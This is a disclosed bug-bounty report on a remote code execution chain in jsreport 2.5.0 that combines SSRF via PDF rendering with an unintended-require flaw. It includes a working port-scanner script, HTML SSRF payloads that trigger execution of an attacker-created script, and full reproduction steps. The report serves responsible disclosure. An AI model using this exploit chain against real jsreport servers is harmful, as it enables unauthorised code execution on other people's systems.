# [jsreport] Remote Code Execution

## Report Details
- **Report ID**: 660565
- **URL**: https://hackerone.com/reports/660565
- **State**: Closed
- **Severity**: high
- **Submitted**: 2019-07-26T05:00:15.970Z
- **Disclosed**: 2020-02-07T15:24:08.771Z

## Reporter
- **Username**: ermilov
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report Remote Code Execution in `jsreport`
It allows running js files remotely on a vulnerable server.

# Module

**module name:** jsreport
**version:** 2.5.0
**npm page:** `https://www.npmjs.com/package/jsreport`

## Module Description

jsreport is a reporting server which lets developers define reports using javascript templating engines (like jsrender or handlebars). It supports various report output formats like html, pdf, excel and others. It also includes advanced reporting features like user management, REST API, scheduling, designer or sending emails.

## Module Stats

52 downloads in the last day
2056 downloads in the last week
6428 downloads in the last month

# Vulnerability

## Vulnerability Description

`jsreport` consists of a variety of packages which combines in one working application. `Script-manager` is one of them, it is utilized for running user's scripts in a sandbox and has an `unintended require` vulnerability (I have a separate report describing this vulnerability) which allows an attacker to load code that was not intended to execute. Another module is `Puppeteer` which is headless Chrome Node API. The application uses it for turning user's HTML into pdf files and unfortunately, the way it is applied allows fetching URLs and sending requests defined in an HTML file by a user which is known as SSRF (Server Side Request Forgery). Chaining these two vulnerabilities (Unintended require + SSRF) leads to remote code execution possibility.

**SSRF:**
SSRF itself is quite simple, generating a pdf report from an HTML template like this one:

    <html>
    <head>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    </head>
    <body>
    		<!-- will send GET request to example.com -->
        <img src="http://example.com/" />
    		<!-- will send POST request to example.com -->
    		<form id="pwn-form" method="POST" action="http://example.com/action">
            <input type="hidden" name='SomeField' value='Some Value' />
        </form>
        <script>
            var form = document.getElementById("pwn-form");
            form.submit();
        </script>
    </body>
    </html>
    

will perform requests from the server to example.com (GET and POST according to examples)
@@ pictures

**Unintended require:**

A detailed description of this bug can be found here #660563. The main idea of this vulnerability is that a separate server is running on a randomly chosen port and as long as we found out the port it is possible to send a request with the path to any script (located on the machine) that we want to execute.

request example:

    {"options": {"rid": 12, "execModulePath": "./../../../pwn.js"}}

**How to find port:**

In order to exploit `script-manager` we can scan ports on the server which runs `jsreport`, by utilizing SSRF (discussed previously). To do it you should create an HTML template which sends an HTTP request to port you would like to check and render it as a pdf in the application. It is easy to distinguish result as long as the response is printed to the pdf output. Of course, it would take ages to check all the ports one-by-one, but I found out some tricks that allow to do it in a few minutes.

First of all, it is possible to do many requests with one HTML page and by checking the output figure out which range of ports includes the one we look for. 

Next helpful thing is the usage of `Debug` mode, if you render the HTML template in Debug mode it returns the output from server log instead of pdf page itself. It saves time and gives a better understanding of what is happening server-side. So by sending a wrong request, you see the output like this:

    Failed to load resource: net::ERR_CONNECTION_REFUSED

if we send a request to the port we are looking for a response would be like this:

    Failed to load resource: the server responded with a status of 500 (Internal Server Error)

in other words, there will be an error in the server response
and script-manager will restart the child server.

Here is another trick: if we send requests too fast and do it before the child server starts again we get a very informative error in debug log:

     Executing script test1 Error: connect ECONNREFUSED 127.0.0.1:39499

Here we go: this is the needed port.

It is actually quite easy to automate these requests and create a script that will do all the work for you.

The final algorithm is:

1. run huge chunks of ports (I guess 1000 ports at a time is good)
2. when we hit an error, try to run requests again and see if we lucky to get the port number in the error's output.
3. if not we just split the range of ports in two halves and repeat steps 1 and 2 on both (divide and conquer approach)
4. in the end we find an error or distinguish the final port by narrowing down the range of ports to the one.

**RCE Steps:**

1. Find out the port of `script-manager`'s vulnerable server by utilizing SSRF in `jsreport` (and automation :))
2. Use `jsreport` to create a js file that will be stored on the machine and which content will be executed on the server.
3. Use SSRF again to send a crafted request to `script-manager`'s vulnerable server and make it execute our file.
4. Done! We executed a user created js file on the server.

F539728

## Steps To Reproduce:

- run `jsreport`, easiest way to do it is to run it as a docker container

    sudo docker run -p 80:5488 -v /jsreport-home:/jsreport jsreport/jsreport:2.5.0

- go to [http://localhost](http://localhost) (or address to server where docker is running) in your browser
- create new template and name it 'test1'

F539730

F539731

- write some HTML to it (e.g. ```<h1>hello world</h1>```) and click 'Save'

F539742

- create portScanner.js localy (outside docker container)

portScanner.js

    const request = require('request')
    
    const name = process.argv[2] // name of the template
    const id = process.argv[3] // id of the template
    const chunkSize = 1000
    const jrUrl = process.argv[4]
      ? `${process.argv[4]}/api/report/${name}` // jsreport url if it is different from localhost
      : `http://localhost/api/report/${name}`
    
    function requestPromise(options) {
      return new Promise((resolve, reject) => {
        request.post(options, function optionalCallback(err, httpResponse, body) {
          if (err) {
            return reject(err)
          }
          resolve(body)
        });
      })
    }
    
    async function checkPorts(start, finish) {
      let content = `
      <html>
        <body>
          <script>
            function printImg(port) {
              var url = 'http://localhost:' + port;
              var resultDiv = document.getElementById('result');
              var img = document.createElement('img');
              img.src = url;
            }
            var ports = [];
            var start = ${start};
            var finish = ${finish};
            for (var i = start; i <= finish; i++) ports.push(i);
            ports.forEach(function(port) {
              printImg(port);
            })
          </script>
        </body>
      </html>
      `
      const formData = {
        template: {
          name: name,
          recipe: 'chrome-pdf',
          shortid: id,
          __entitySet: 'templates',
          __name: name,
          engine: 'handlebars',
          chrome: {printBackground: 'true'},
          content: content,
          __isLoaded: 'true',
          __recipe: 'chrome-pdf',
          __shortid: id,
          __isDirty: 'false'
        },
        options: {
          debug: {
            logsToResponse: 'true'
          },
          preview: 'true'
        }
      }
    
      const body = await requestPromise({url: jrUrl, form: formData})
      if (body.indexOf('connect ECONNREFUSED 127.0.0.1:') > -1) {
        const rgx = /connect ECONNREFUSED 127.0.0.1:(\d*)/g
        const match = rgx.exec(body)
        console.log('match', match)
        return match[1] || true
      } else if (body.indexOf('Failed to load resource: the server responded with a status of 500 (Internal Server Error)') > -1) {
        return true
      } else 
      return false
    }
    
    // checking ports by `divide and conquer` approach
    // which means checking a huge chunk of ports at once an then narrowing down till we hit the only possible port
    // takes about 16 iterations to figure it out
    // anyway its faster then manually checking 65k ports
    async function checker(start, finish) {
      const rp = await checkPorts(start, finish)
      if (rp) {
        if (typeof rp === 'string') { // string is returned when port is extracted from an error message
          return rp
        } else if (start === finish) {
          return start
        } else {
          const middle = Math.floor((finish + start) / 2)
          const tmp1 = await checker(start, middle)
          const tmp2 = await checker(middle+1, finish)
          return tmp1 || tmp2
        }
      }
    }
    
    (async function main(){
      // ports range
      const start = 1024
      const finish = 65535
    
      // split ports range into chunks of 1000
      let first = start
      let last = start + 1000
    
      let stopEnum = false
      while (!stopEnum) {
        if ( last > finish ) {
          last = finish
          stopEnum = true
        }
        // checking every port from `first` to `last`
        const result = await checker(first, last)
        if (result) {
          console.log(result);
          return;
        }
        first = last + 1
        last = first + 1000
      }
    })()

- run portScanner.js

    node portScanner.js **test1** **templateId**

where **test1** - name of the template (actually 'test1' that we created previously)

**templateId** - id of the template (may be extracted from the temlates URL)

F539733

e.g. node portScanner.js test1 BJe2Pi2AgB

if you don't run docker on [localhost](http://localhost) you may add docker's address as a 3rd parameter (check portScanner.js code for clarity)

e.g http://my-jsreport-addr.app

    node portScanner.js test1 id_from_jsreport http://my-jsreport-addr.app

- wait untill it finishes and logs the port number

F539741

- then create a new script in `jsreport` and name it 'pwn.js'

F539734

F539735

this script we will be able to execute on the server

so for demonstration purposes source code is:

    console.log('PWNED')
    var ls = require('fs').readdirSync('./')
    console.log(ls)

the idea is to list files in the application root directory

- insert this source code into pwn.js

F539736

- create new template 'test2'

F539737

- insert HTML code which will exploit the `script-manager` (change xxxx for the value of the previously found script-manager's port) and click `Save`

> don't forget to put the right port into code snippet

    <html>
    <head>
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    </head>
    <body>
        123 <img src=x />
    		<!-- xxxx is the scipt-manager's port -->
        <form id="pwn-form" enctype="text/plain" method="POST" action="http://localhost:xxxx/">
            <input type="hidden" name='{"test' value='":1, "options": {"rid": 12, "execModulePath": "./../../../data/pwn.js/content.js"}}' />
        </form>
        <script>
            var form = document.getElementById("pwn-form");
            form.submit();
        </script>
    </body>
    </html>

F539738

- then click `Run` (don't forget aboud 'chrome-pdf' mode)

F539739

- you will see an error message as an output and result of 'pwn.js' logged to console on the server

F539740

## Patch

## Supporting Material/References:

- OS: Linux Mint current
- Node.js: 10.16.0
- NPM: 6.9.0

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: N

## Impact

An attacker is able to create and execute js code on the server

## Attachments
- jsreport_scheme_(1).png
- screen1.png
- screen2.png
- ______________2019-07-26_14-28-56.png
- screen4_1.png
- screen_5.png
- screen_6.png
- screen_7.png
- screen_8.png
- screen_9.png
- pwn.png
- 12354.png
- screen3_1.png
